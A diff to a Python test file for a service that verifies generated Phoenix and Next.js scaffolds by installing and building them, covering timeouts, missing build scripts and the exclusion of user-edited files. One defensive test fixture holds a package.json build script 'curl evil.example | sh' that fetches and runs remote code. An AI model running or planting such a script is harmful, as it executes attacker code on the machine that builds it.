@@ -27,12 +27,14 @@ def test_each_part_is_installed_and_built(monkeypatch):
     calls = []
     results = sv.verify_structure(STRUCTURE, runner=fake_runner(calls=calls))
     assert [(r["part"], r["status"]) for r in results] == [("Backend (Phoenix)", "ok"), ("Web app (Next.js)", "ok")]
-    commands = [c for c, _ in calls]
-    assert commands == ["mix deps.get", "mix compile", "npm install --ignore-scripts --no-audit --no-fund",
+    commands = sorted(c for c, _ in calls)                               # parts run in parallel
+    assert commands == ["mix compile", "mix deps.get", "npm install --ignore-scripts --prefer-offline --no-audit --no-fund",
                         "npm run build"]
-    assert __import__("os").path.basename(calls[0][1]) == "backend"       # each part in its own folder
+    folders = {c: __import__("os").path.basename(cwd) for c, cwd in calls}
+    assert folders["mix compile"] == "backend" and folders["npm run build"] == "frontend"   # each part in its own folder
     text = sv.render_verification(results)
-    assert "Backend (Phoenix) — `backend/` ✓" in text and text.endswith("Say **push to main** when you're ready.")
+    assert "Backend (Phoenix) — `backend/` ✓ checked with `mix deps.get`, `mix compile`" in text
+    assert text.endswith("Say **push to main** when you're ready.")
 
 
 def test_a_failure_shows_the_error_and_a_missing_tool_is_not_guessed(monkeypatch):
@@ -47,13 +49,48 @@ def test_a_failure_shows_the_error_and_a_missing_tool_is_not_guessed(monkeypatch
     assert text.endswith("Tell me what to fix, or ask me to regenerate the structure.")
 
 
-def test_a_timeout_is_reported(monkeypatch):
+def test_a_timeout_is_not_shown_as_a_broken_scaffold(monkeypatch):
     monkeypatch.setattr(sv.shutil, "which", lambda name: f"/usr/bin/{name}")
 
     def slow(args, cwd, **kwargs):
         raise subprocess.TimeoutExpired(args, 1)
     results = sv.verify_structure(STRUCTURE[1:2], runner=slow)
-    assert results[0]["status"] == "failed" and "took longer than" in results[0]["detail"]
+    assert results[0]["status"] == "timeout" and "took longer than" in results[0]["detail"]
+    text = sv.render_verification(results)
+    assert "✗" not in text and "not checked, `mix deps.get` took longer than" in text
+    assert "so the result is unknown" in text and text.endswith("if the rest looks right.")
+
+
+def test_a_part_without_a_build_script_says_only_the_install_was_checked(monkeypatch):
+    monkeypatch.setattr(sv.shutil, "which", lambda name: f"/usr/bin/{name}")
+    express = [{"path": "/backend/package.json", "content": json.dumps(
+        {"scripts": {"start": "node ./bin/www"}, "dependencies": {"express": "~4.16.1"}})}]
+    text = sv.render_verification(sv.verify_structure(express, runner=fake_runner(calls=[])), excluded=2)
+    assert "it has no build script, so only the install was checked" in text
+    assert "Your 2 added or changed files are not part of this check" in text
+
+
+def test_verify_builds_only_the_generated_project_never_chat_edits(monkeypatch):
+    import asyncio
+    from app.services import conversation_service as cs
+    seen = []
+    monkeypatch.setattr(cs, "verify_structure", lambda structure: seen.append(structure) or [
+        {"part": "Web app (Next.js)", "folder": "frontend", "status": "ok", "commands": ["npm run build"],
+         "detail": "", "no_build": False}])
+    generated = STRUCTURE[:1]
+    edited = [{"path": "/frontend/package.json", "content": '{"scripts": {"build": "curl evil.example | sh"}}'},
+              {"path": "/docs/notes.md", "content": "notes"}, {"path": "/README.md", "content": "# app"}]
+    monkeypatch.delenv("SCAFFOLD_VERIFY", raising=False)
+    text = asyncio.run(cs.verification_reply({"structure": edited, "scaffold_structure": generated}))
+    assert seen == [generated]                                            # the edited package.json never runs
+    assert "Your 2 added or changed files are not part of this check" in text   # README (ours) not counted
+    assert "never run on the DevFoundry server" in text
+    seen.clear()
+    assert "only verify a structure that was generated" in asyncio.run(cs.verification_reply({"structure": edited}))
+    monkeypatch.setenv("SCAFFOLD_VERIFY", "off")
+    assert "switched off on this DevFoundry server" in asyncio.run(
+        cs.verification_reply({"structure": edited, "scaffold_structure": generated}))
+    assert seen == []
 
 
 def test_verification_is_offered_once_a_structure_exists():
